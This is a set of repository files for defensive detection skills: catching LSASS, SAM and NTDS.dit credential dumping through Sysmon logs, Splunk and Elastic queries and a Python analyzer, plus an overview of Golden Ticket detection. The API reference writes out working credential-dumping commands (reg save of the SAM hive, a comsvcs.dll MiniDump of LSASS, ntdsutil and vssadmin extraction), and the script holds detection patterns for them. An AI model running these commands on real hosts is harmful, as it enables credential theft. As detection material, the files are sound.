

===== FILE: skills/detecting-credential-dumping-techniques/SKILL.md =====
---
name: detecting-credential-dumping-techniques
description: Detect LSASS credential dumping, SAM database extraction, and NTDS.dit theft (e.g. via Mimikatz) using Sysmon Event ID 10 process-access logging, Windows Security logs, and SIEM correlation rules. Use when hunting for credential-theft activity on Windows/Active Directory hosts or triaging EDR alerts on LSASS access.
domain: cybersecurity
subdomain: threat-detection
tags:
- credential-dumping
- lsass
- mimikatz
- sysmon
- active-directory
- windows-security
- defense-evasion
version: '1.0'
author: mahipal
license: Apache-2.0
d3fend_techniques:
- Token Binding
- Execution Isolation
- File Metadata Consistency Validation
- Restore Access
- Application Protocol Command Analysis
nist_csf:
- DE.CM-01
- DE.AE-02
- DE.AE-06
- ID.RA-05
mitre_attack:
- T1078
- T1190
- T1059
- T1003
- T1110
mitre_f3:
  version: '1.1'
  tactics:
  - reconnaissance
  - positioning
  - initial-access
  techniques:
  - id: T1555
    name: Credentials from Password Stores
    tactic: reconnaissance
    source: attack
  - id: T1555.003
    name: 'Credentials from Password Stores: Credentials from Web Browsers'
    tactic: reconnaissance
    source: attack
  - id: T1539
    name: Steal Web Session Cookie
    tactic: positioning
    source: attack
  - id: F1006.002
    name: 'Account Takeover: Exposed Login Credential'
    tactic: initial-access
    source: f3
  - id: T1110.002
    name: 'Brute Force: Password Cracking'
    tactic: initial-access
    source: attack
---

# Detecting Credential Dumping Techniques

## Overview

Credential dumping (MITRE ATT&CK T1003) is a post-exploitation technique where adversaries extract authentication credentials from OS memory, registry hives, or domain controller databases. This skill covers detection of LSASS memory access via Sysmon Event ID 10 (ProcessAccess), SAM registry hive export via reg.exe, NTDS.dit extraction via ntdsutil/vssadmin, and comsvcs.dll MiniDump abuse. Detection rules analyze GrantedAccess bitmasks, suspicious calling processes, and known tool signatures.


## When to Use

- When investigating security incidents that require detecting credential dumping techniques
- When building detection rules or threat hunting queries for this domain
- When SOC analysts need structured procedures for this analysis type
- When validating security monitoring coverage for related attack techniques

## Prerequisites

- Sysmon v14+ deployed with ProcessAccess logging (Event ID 10) for lsass.exe
- Windows Security audit policy enabling process creation (Event ID 4688) with command line logging
- Splunk or Elastic SIEM ingesting Sysmon and Windows Security logs
- Python 3.8+ for log analysis

## Steps

1. Configure Sysmon to log ProcessAccess events targeting lsass.exe
2. Forward Sysmon Event ID 10 and Windows Event ID 4688 to SIEM
3. Create detection rules for known GrantedAccess patterns (0x1010, 0x1FFFFF)
4. Detect comsvcs.dll MiniDump and procdump.exe targeting LSASS PID
5. Alert on reg.exe SAM/SECURITY/SYSTEM hive export commands
6. Detect ntdsutil/vssadmin shadow copy creation for NTDS.dit theft
7. Correlate detections with user/host context for risk scoring

## Expected Output

JSON report containing detected credential dumping indicators with technique classification, severity ratings, process details, MITRE ATT&CK mapping, and Splunk/Elastic detection queries.

===== END FILE =====


===== FILE: skills/detecting-credential-dumping-techniques/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/detecting-credential-dumping-techniques/SKILL.es.md =====
---
name: detecting-credential-dumping-techniques
description: Detect LSASS credential dumping, SAM database extraction, and NTDS.dit theft using Sysmon Event ID 10, Windows Security logs, and SIEM correlation rules
domain: cybersecurity
subdomain: threat-detection
tags:
  - credential-dumping
  - lsass
  - mimikatz
  - sysmon
  - active-directory
  - windows-security
  - defense-evasion
version: "1.0"
author: mahipal
license: Apache-2.0
language: es
---

# Detección de Técnicas de Volcado de Credenciales

## Descripción General

El volcado de credenciales (MITRE ATT&CK T1003) es una técnica de post-explotación donde los adversarios extraen credenciales de autenticación de la memoria del sistema operativo, hives del registro o bases de datos del controlador de dominio. Esta habilidad cubre la detección de acceso a la memoria de LSASS mediante Sysmon Event ID 10 (ProcessAccess), la exportación del hive del registro SAM mediante reg.exe, la extracción de NTDS.dit mediante ntdsutil/vssadmin, y el abuso de MiniDump con comsvcs.dll. Las reglas de detección analizan bitmasks de GrantedAccess, procesos invocantes sospechosos y firmas de herramientas conocidas.

## Requisitos Previos

- Sysmon v14+ desplegado con registro de ProcessAccess (Event ID 10) para lsass.exe
- Política de auditoría de seguridad de Windows habilitando la creación de procesos (Event ID 4688) con registro de línea de comandos
- SIEM Splunk o Elastic ingiriendo registros de Sysmon y de seguridad de Windows
- Python 3.8+ para análisis de registros

## Pasos

1. Configurar Sysmon para registrar eventos ProcessAccess dirigidos a lsass.exe
2. Reenviar Sysmon Event ID 10 y Windows Event ID 4688 al SIEM
3. Crear reglas de detección para patrones de GrantedAccess conocidos (0x1010, 0x1FFFFF)
4. Detectar MiniDump con comsvcs.dll y procdump.exe apuntando al PID de LSASS
5. Alertar sobre comandos de exportación de hives SAM/SECURITY/SYSTEM mediante reg.exe
6. Detectar creación de shadow copy con ntdsutil/vssadmin para robo de NTDS.dit
7. Correlacionar detecciones con contexto de usuario/host para puntuación de riesgo

## Salida Esperada

Informe JSON que contiene indicadores detectados de volcado de credenciales con clasificación de técnica, calificaciones de severidad, detalles del proceso, mapeo a MITRE ATT&CK, y consultas de detección para Splunk/Elastic.

===== END FILE =====


===== FILE: skills/detecting-credential-dumping-techniques/references/api-reference.md =====
# Credential Dumping Detection API Reference

## Sysmon Event ID 10 - ProcessAccess

### Key Fields
```
SourceImage       - Process accessing LSASS
SourceProcessId   - PID of accessing process
TargetImage       - Should be C:\Windows\System32\lsass.exe
GrantedAccess     - Access rights bitmask
CallTrace         - DLL call stack of the access
```

### Suspicious GrantedAccess Values
| Value | Meaning | Tool Association |
|-------|---------|-----------------|
| 0x1010 | VM_READ + QUERY_LIMITED | Mimikatz |
| 0x1410 | VM_READ + QUERY_INFO | ProcDump |
| 0x1FFFFF | PROCESS_ALL_ACCESS | Various dumpers |
| 0x1438 | VM_READ + QUERY + DUP_HANDLE | Cobalt Strike |
| 0x40 | DUP_HANDLE only | Handle duplication |

## Sysmon Event ID 1 - Process Creation

### Command Line Patterns for Credential Theft
```
# SAM hive export
reg save hklm\sam C:\temp\sam.hiv
reg save hklm\security C:\temp\security.hiv
reg save hklm\system C:\temp\system.hiv

# comsvcs.dll LSASS dump
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> dump.bin full

# NTDS.dit extraction
ntdsutil "activate instance ntds" ifm "create full C:\temp"
vssadmin create shadow /for=C:
```

## Splunk SPL Queries

### LSASS Access Detection
```spl
index=sysmon EventCode=10 TargetImage="*\\lsass.exe"
  GrantedAccess IN ("0x1010","0x1FFFFF","0x1410","0x1438")
  SourceImage!="*\\csrss.exe" SourceImage!="*\\svchost.exe"
| stats count by SourceImage, GrantedAccess, Computer, User
| sort -count
```

### comsvcs.dll MiniDump Detection
```spl
index=sysmon EventCode=1
  (CommandLine="*comsvcs*MiniDump*" OR CommandLine="*comsvcs*#24*")
| table _time, Computer, User, ParentImage, CommandLine
```

### SAM/SECURITY Hive Export
```spl
index=sysmon EventCode=1 Image="*\\reg.exe"
  (CommandLine="*save*hklm\\sam*" OR CommandLine="*save*hklm\\security*")
| table _time, Computer, User, CommandLine
```

## Elastic / KQL Queries

### LSASS Access in Elastic
```kql
event.code: "10" AND
  winlog.event_data.TargetImage: *lsass.exe AND
  winlog.event_data.GrantedAccess: ("0x1010" OR "0x1FFFFF")
```

### Process Creation with Credential Theft Commands
```kql
event.code: "1" AND
  (process.command_line: *comsvcs*MiniDump* OR
   process.command_line: *reg*save*hklm\\sam*)
```

## MITRE ATT&CK Mapping

| Sub-technique | ID | Detection Method |
|---|---|---|
| LSASS Memory | T1003.001 | Sysmon EID 10 GrantedAccess |
| Security Account Manager | T1003.002 | reg.exe save commands |
| NTDS | T1003.003 | ntdsutil / vssadmin commands |
| DCSync | T1003.006 | Event ID 4662 with replication GUIDs |

## CLI Usage

```bash
# Analyze Sysmon XML export
python agent.py --sysmon-xml sysmon_events.xml --output cred_report.json

# Print Splunk detection queries
python agent.py --show-splunk
```

===== END FILE =====


===== FILE: skills/detecting-credential-dumping-techniques/scripts/agent.py =====
#!/usr/bin/env python3
"""Detect credential dumping techniques via Sysmon/Windows event log analysis."""

import json
import re
import argparse
import xml.etree.ElementTree as ET
from datetime import datetime


LSASS_GRANTED_ACCESS_SUSPICIOUS = {
    "0x1010": "PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION (Mimikatz-style)",
    "0x1410": "PROCESS_VM_READ | PROCESS_QUERY_INFORMATION (procdump-style)",
    "0x1FFFFF": "PROCESS_ALL_ACCESS (full access to LSASS)",
    "0x1438": "PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE",
    "0x40": "PROCESS_DUP_HANDLE (handle duplication for indirect access)",
}

SUSPICIOUS_CALLERS = [
    "mimikatz", "procdump", "rundll32.exe", "taskmgr.exe",
    "powershell.exe", "cmd.exe", "wmic.exe", "cscript.exe", "wscript.exe",
]

SAM_EXPORT_PATTERNS = [
    r"reg\s+save\s+hklm\\sam",
    r"reg\s+save\s+hklm\\security",
    r"reg\s+save\s+hklm\\system",
    r"esentutl.*ntds\.dit",
    r"ntdsutil.*\"activate instance ntds\"",
    r"vssadmin\s+create\s+shadow",
    r"copy\s+\\\\.*\\c\$.*ntds\.dit",
    r"secretsdump",
]

COMSVCS_PATTERNS = [
    r"comsvcs\.dll.*MiniDump",
    r"comsvcs\.dll.*#24",
    r"rundll32.*comsvcs",
]


def parse_sysmon_xml(xml_path):
    """Parse Sysmon event log XML export for Event ID 10 (ProcessAccess)."""
    tree = ET.parse(xml_path)
    root = tree.getroot()
    ns = {"e": "http://schemas.microsoft.com/win/2004/08/events/event"}
    events = []
    for event_el in root.findall(".//e:Event", ns):
        sys_el = event_el.find("e:System", ns)
        event_id = int(sys_el.find("e:EventID", ns).text)
        time_created = sys_el.find("e:TimeCreated", ns).attrib.get("SystemTime", "")
        data_el = event_el.find("e:EventData", ns)
        fields = {}
        for d in data_el.findall("e:Data", ns):
            fields[d.attrib.get("Name", "")] = d.text or ""
        events.append({"event_id": event_id, "timestamp": time_created, **fields})
    return events


def detect_lsass_access(events):
    """Detect suspicious ProcessAccess (Event ID 10) targeting lsass.exe."""
    alerts = []
    for ev in events:
        if ev["event_id"] != 10:
            continue
        target = ev.get("TargetImage", "").lower()
        if "lsass.exe" not in target:
            continue
        granted = ev.get("GrantedAccess", "")
        source_image = ev.get("SourceImage", "").lower()
        source_name = source_image.split("\\")[-1] if source_image else ""
        severity = "medium"
        reasons = []
        if granted in LSASS_GRANTED_ACCESS_SUSPICIOUS:
            reasons.append(f"Suspicious GrantedAccess {granted}: {LSASS_GRANTED_ACCESS_SUSPICIOUS[granted]}")
            severity = "critical" if granted == "0x1FFFFF" else "high"
        if any(s in source_name for s in SUSPICIOUS_CALLERS):
            reasons.append(f"Suspicious calling process: {source_name}")
            severity = "critical"
        if not reasons:
            continue
        alerts.append({
            "detection": "LSASS Memory Access",
            "mitre_technique": "T1003.001",
            "timestamp": ev["timestamp"],
            "source_process": ev.get("SourceImage", ""),
            "source_pid": ev.get("SourceProcessId", ""),
            "target_process": ev.get("TargetImage", ""),
            "granted_access": granted,
            "call_trace": ev.get("CallTrace", "")[:200],
            "severity": severity,
            "reasons": reasons,
            "user": ev.get("SourceUser", ev.get("User", "")),
            "host": ev.get("Computer", ""),
        })
    return alerts


def detect_credential_commands(events):
    """Detect SAM/NTDS.dit export and comsvcs.dll dump commands from Event ID 1 or 4688."""
    alerts = []
    for ev in events:
        if ev["event_id"] not in (1, 4688):
            continue
        cmdline = ev.get("CommandLine", ev.get("ProcessCommandLine", "")).lower()
        if not cmdline:
            continue
        for pattern in SAM_EXPORT_PATTERNS:
            if re.search(pattern, cmdline, re.IGNORECASE):
                technique = "T1003.002" if "sam" in cmdline or "security" in cmdline else "T1003.003"
                alerts.append({
                    "detection": "Registry Hive / NTDS.dit Export",
                    "mitre_technique": technique,
                    "timestamp": ev["timestamp"],
                    "command_line": ev.get("CommandLine", ev.get("ProcessCommandLine", "")),
                    "process": ev.get("Image", ev.get("NewProcessName", "")),
                    "user": ev.get("User", ev.get("SubjectUserName", "")),
                    "severity": "critical",
                })
                break
        for pattern in COMSVCS_PATTERNS:
            if re.search(pattern, cmdline, re.IGNORECASE):
                alerts.append({
                    "detection": "LSASS Dump via comsvcs.dll",
                    "mitre_technique": "T1003.001",
                    "timestamp": ev["timestamp"],
                    "command_line": ev.get("CommandLine", ev.get("ProcessCommandLine", "")),
                    "process": ev.get("Image", ev.get("NewProcessName", "")),
                    "user": ev.get("User", ev.get("SubjectUserName", "")),
                    "severity": "critical",
                })
                break
    return alerts


def detect_ntdll_access(events):
    """Detect suspicious ntdll.dll access patterns in CallTrace (Mimikatz signature)."""
    alerts = []
    for ev in events:
        if ev["event_id"] != 10:
            continue
        call_trace = ev.get("CallTrace", "")
        if "ntdll.dll" in call_trace.lower() and "UNKNOWN" in call_trace:
            target = ev.get("TargetImage", "").lower()
            if "lsass.exe" in target:
                alerts.append({
                    "detection": "NTDLL Suspicious CallTrace (Mimikatz Signature)",
                    "mitre_technique": "T1003.001",
                    "timestamp": ev["timestamp"],
                    "source_process": ev.get("SourceImage", ""),
                    "call_trace_snippet": call_trace[:300],
                    "severity": "critical",
                })
    return alerts


def generate_splunk_queries():
    """Return SPL detection queries for credential dumping."""
    return {
        "lsass_access": (
            'index=sysmon EventCode=10 TargetImage="*\\\\lsass.exe" '
            'GrantedAccess IN ("0x1010","0x1FFFFF","0x1410","0x1438") '
            '| stats count by SourceImage, GrantedAccess, Computer'
        ),
        "comsvcs_dump": (
            'index=sysmon EventCode=1 CommandLine="*comsvcs*MiniDump*" '
            'OR CommandLine="*comsvcs*#24*" | table _time, Computer, User, CommandLine'
        ),
        "sam_export": (
            'index=sysmon EventCode=1 (CommandLine="*reg*save*hklm\\\\sam*" '
            'OR CommandLine="*reg*save*hklm\\\\security*") '
            '| table _time, Computer, User, CommandLine'
        ),
        "ntds_extraction": (
            'index=sysmon EventCode=1 (CommandLine="*ntdsutil*" '
            'OR CommandLine="*vssadmin*create*shadow*") '
            '| table _time, Computer, User, CommandLine'
        ),
    }


def main():
    parser = argparse.ArgumentParser(description="Credential Dumping Detection Agent")
    parser.add_argument("--sysmon-xml", help="Path to Sysmon event log XML export")
    parser.add_argument("--output", default="credential_dump_report.json", help="Output report path")
    parser.add_argument("--show-splunk", action="store_true", help="Print Splunk detection queries")
    args = parser.parse_args()

    if args.show_splunk:
        for name, spl in generate_splunk_queries().items():
            print(f"\n--- {name} ---\n{spl}")
        return

    if not args.sysmon_xml:
        print("[!] Provide --sysmon-xml path or use --show-splunk for detection queries")
        return

    events = parse_sysmon_xml(args.sysmon_xml)
    print(f"[+] Parsed {len(events)} Sysmon/Security events")

    lsass_alerts = detect_lsass_access(events)
    cmd_alerts = detect_credential_commands(events)
    ntdll_alerts = detect_ntdll_access(events)

    report = {
        "analysis_time": datetime.utcnow().isoformat() + "Z",
        "total_events": len(events),
        "detections": {
            "lsass_memory_access": lsass_alerts,
            "credential_export_commands": cmd_alerts,
            "ntdll_suspicious_calltrace": ntdll_alerts,
        },
        "total_alerts": len(lsass_alerts) + len(cmd_alerts) + len(ntdll_alerts),
        "mitre_techniques": ["T1003.001", "T1003.002", "T1003.003"],
        "splunk_queries": generate_splunk_queries(),
    }

    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)
    print(f"[+] LSASS access alerts: {len(lsass_alerts)}")
    print(f"[+] Credential export commands: {len(cmd_alerts)}")
    print(f"[+] NTDLL suspicious traces: {len(ntdll_alerts)}")
    print(f"[+] Report saved to {args.output}")


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/detecting-golden-ticket-forgery/SKILL.md =====
---
name: detecting-golden-ticket-forgery
description: Detect Kerberos Golden Ticket forgery (e.g. Mimikatz-forged tickets) by analyzing
  Windows Event ID 4769 for RC4 encryption downgrades (0x17), abnormal ticket lifetimes,
  and krbtgt account anomalies using Splunk and Elastic SIEM queries. Use when investigating
  suspected forged Kerberos tickets or krbtgt credential theft in Active Directory.
domain: cybersecurity
subdomain: threat-detection
tags:
- golden-ticket
- kerberos
- active-directory
- mimikatz
- splunk
- credential-theft
- windows-security
version: '1.0'
author: mahipal
license: Apache-2.0
d3fend_techniques:
- Token Binding
- Restore Access
- Reissue Credential
- Decoy User Credential
- Authentication Cache Invalidation
nist_csf:
- DE.CM-01
- DE.AE-02
- DE.AE-06
- ID.RA-05
mitre_attack:
- T1078
- T1190
- T1059
- T1003
- T1110
---

# Detecting Golden Ticket Forgery

## Overview

A Golden Ticket attack (MITRE ATT&CK T1558.001) involves forging a Kerberos Ticket Granting Ticket (TGT) using the krbtgt account NTLM hash, granting unrestricted access to any service in the Active Directory domain. This skill detects Golden Ticket usage by analyzing Event ID 4769 for RC4 encryption type (0x17) in environments enforcing AES, identifying tickets with abnormal lifetimes exceeding domain policy, correlating TGS requests with missing corresponding TGT requests (Event ID 4768), and detecting krbtgt password age anomalies.


## When to Use

- When investigating security incidents that require detecting golden ticket forgery
- When building detection rules or threat hunting queries for this domain
- When SOC analysts need structured procedures for this analysis type
- When validating security monitoring coverage for related attack techniques

## Prerequisites

- Windows Domain Controller with Kerberos audit logging enabled
- Splunk or Elastic SIEM ingesting Windows Security event logs
- Python 3.8+ for offline event log analysis
- Knowledge of domain Kerberos encryption policy (AES vs RC4)

## Steps

1. Audit domain Kerberos encryption policy to establish AES-only baseline
2. Forward Event IDs 4768 and 4769 to SIEM platform
3. Detect RC4 (0x17) encryption in TGS requests where AES is enforced
4. Identify TGS requests without corresponding TGT requests (forged ticket indicator)
5. Alert on ticket lifetimes exceeding MaxTicketAge domain policy
6. Monitor krbtgt account password age and last reset date
7. Correlate findings with host/user context for risk scoring

## Expected Output

JSON report with Golden Ticket indicators including RC4 downgrades, orphaned TGS requests, abnormal ticket lifetimes, and risk-scored alerts with MITRE ATT&CK technique mapping.

===== END FILE =====


===== FILE: skills/detecting-golden-ticket-forgery/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
